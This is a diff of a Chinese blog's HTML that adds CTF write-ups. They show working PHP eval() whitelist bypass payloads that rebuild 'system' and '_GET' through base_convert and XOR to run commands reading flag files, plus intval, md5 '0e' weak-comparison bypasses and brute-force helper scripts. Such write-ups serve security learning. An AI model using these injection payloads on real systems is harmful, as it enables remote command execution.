@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,186 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-数字函数及其白名单和黑名单的过滤" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/05/%E6%95%B0%E5%AD%97%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%99%BD%E5%90%8D%E5%8D%95%E5%92%8C%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4/" class="article-date">
+  	<time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/05/%E6%95%B0%E5%AD%97%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%99%BD%E5%90%8D%E5%8D%95%E5%92%8C%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4/">
+        数字函数及其白名单和黑名单的过滤
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="数字函数及其白名单和黑名单的过滤"><a href="#数字函数及其白名单和黑名单的过滤" class="headerlink" title="数字函数及其白名单和黑名单的过滤"></a>数字函数及其白名单和黑名单的过滤</h1><p>打开页面，看到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);</span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过源码，我们可以看到eval()这个危险函数，但是也看见了正则过滤和白名单和黑名单，因此我们需要绕过这些过滤，然后在eval()中构造恶意代码，限制有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 输入的字符串只能在80个字符以内（不包含80个字符）</span><br><span class="line"></span><br><span class="line">2. $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    你不可以有空格、$、_、[、]、换行符、单引号、双引号</span><br><span class="line"></span><br><span class="line">3. $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">要有这些数学函数，但是可以选一个或多个</span><br></pre></td></tr></table></figure>
+<p>常用数学函数：<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/php/php_ref_math.asp">http://www.w3school.com.cn/php/php_ref_math.asp</a></p>
+<p>所以我们只能使用白名单中的数学函数及其“.”和“^”等，同时字符数限制在80个以内</p>
+<h2 id="php语言的特点"><a href="#php语言的特点" class="headerlink" title="php语言的特点"></a>php语言的特点</h2><h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><p>php中可以把函数名通过字符串的形式传递给一个变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$function=&quot;sayhello&quot;;$function();</span><br><span class="line"></span><br><span class="line">相当于</span><br><span class="line"></span><br><span class="line">sayhello();</span><br></pre></td></tr></table></figure>
+
+<h3 id="php中函数名默认为字符串"><a href="#php中函数名默认为字符串" class="headerlink" title="php中函数名默认为字符串"></a>php中函数名默认为字符串</h3><p>如白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择，下面有个例子：</p>
+<p>在数学函数中有个is_nan()函数和tan()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$i=is_nan^(6).(4);  #函数名可以作为字符串，参与异或，同时右边有两个字符，所以左边也会只取两个字符，所以相当于”is^(6).(4)“</span><br><span class="line"></span><br><span class="line">$j=tan^(1)(5); #相当于”ta^(1)(5)“</span><br><span class="line"></span><br><span class="line">echo $i; #结果为_G</span><br><span class="line"></span><br><span class="line">echo $j; #结果为ET</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>按照这两个php特性，我们可以加以利用<br>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br></pre></td></tr></table></figure>
+<p>其中&amp;abs=tac flag.php有空格并不影响，因为它不会参与过滤，同时分析payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;</span><br><span class="line">dechex(1598506324) =&gt;&quot;5f474554&quot;</span><br><span class="line">$pi=hex2bin(&quot;5f474554&quot;) =&gt;”$pi=&quot;_GET&quot;“</span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;1&#125;($_GET)&#123;2&#125;</span><br></pre></td></tr></table></figure>
+<p>其中hex2bin()函数会将16进制转换为ascii字符串，其中为什么base_convert()是37907361743，这是我写的一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;=1000000000;$i++)&#123;</span><br><span class="line">	$hex=base_convert($i,10,36);</span><br><span class="line">	if($hex=&quot;hex2bin&quot;)&#123;</span><br><span class="line">		echo $i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当然介意百度或记住这个函数的10进制值，如果本地测试($_GET){1}(($_GET){2})建议使用7版本的phpsyudy，否则会出错</p>
+<p>也可以用header来传，即使用getallheaders()函数</p>
+<p>getallheaders()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheader()---------------------------------------获取全部HTTP请求头信息</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get提交：$pi=base_convert;$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">post提交：1=命令</span><br></pre></td></tr></table></figure>
+
+<p>分析payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36) =&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+<p>也可以构造exec(‘cat f*’)或system(‘cat f*’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以使用php语言中可以将函数名当作字符串进行异或的特性，所以我们可以写一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;,  &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">for($k=1;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i = 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j = 0;$j &lt;=9;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-robots文件及inval函数和mad5绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/05/robots%E6%96%87%E4%BB%B6%E5%8F%8Ainval%E5%87%BD%E6%95%B0%E5%92%8Cmad5%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/05/robots%E6%96%87%E4%BB%B6%E5%8F%8Ainval%E5%87%BD%E6%95%B0%E5%92%8Cmad5%E7%BB%95%E8%BF%87/">
+        robots.txt文件及inval函数和md5绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="robots文件及inval函数和md5绕过"><a href="#robots文件及inval函数和md5绕过" class="headerlink" title="robots文件及inval函数和md5绕过"></a>robots文件及inval函数和md5绕过</h1><p>打开页面，发现有bot文字出现，所以我们可以考虑是robots.txt文件，即访问限制的文件，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br></pre></td></tr></table></figure>
+<p>我们可以看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：/fAke_flagggg.php</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们访问/fAke_flagggg.php文件，发现flag{this_is_not_flag}，然后我们刷新再抓包，发现回显的包中有一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Look_at_me：fl4g.php</span><br></pre></td></tr></table></figure>
+
+<p>然后去访问/fl4g.php文件，发现有源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>发现有三层的过滤</p>
+<p>第一层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(intval($num)&lt;2020 &amp;&amp; intval($num+1)&gt;2021)&#123;</span><br><span class="line"></span><br><span class="line">	echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中intval()函数为获取变量的整数值，所以intval()函数的参数如果输入科学计数法的字符串的话，会以e前面的数字返回值，而对于科学计数法+数字的话，会返回字符串类型，本地调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num=3e3;</span><br><span class="line">echo(intval($num));</span><br><span class="line">echo(&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">echo(intval($num+1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这样就可以绕过这层过滤</p>
+<p>第二层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($md5==md5($md5))&#123;</span><br><span class="line">	echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以利用php弱类型进行绕过，就是当用==对两个md5的值进行比较时，如果md5的值的前两位为0e时，hash值会为0，致使两个不同的md5值相同，不过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e后面的必须是数字</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+<p>来进行绕过，然后写了一个简陋的exp来获取可以使用的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($k=0;$k&lt;=1000000000;$k++)&#123;</span><br><span class="line">	$i=&quot;0e&quot;.$k;</span><br><span class="line">	$j=substr(md5($i),0,2);</span><br><span class="line">	if($j==&quot;0e&quot;)&#123;</span><br><span class="line">		for($h=2;$h&lt;strlen(md5($i));$h++)&#123;</span><br><span class="line">			if(substr(md5($i),$h,1)&lt;&#x27;0&#x27; || substr(md5($i),$h,1)&gt;&#x27;9&#x27;)&#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	echo $h;      </span><br><span class="line">	if($h==strlen(md5($i)))&#123;</span><br><span class="line">		echo &quot;0e&quot;.$k;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span 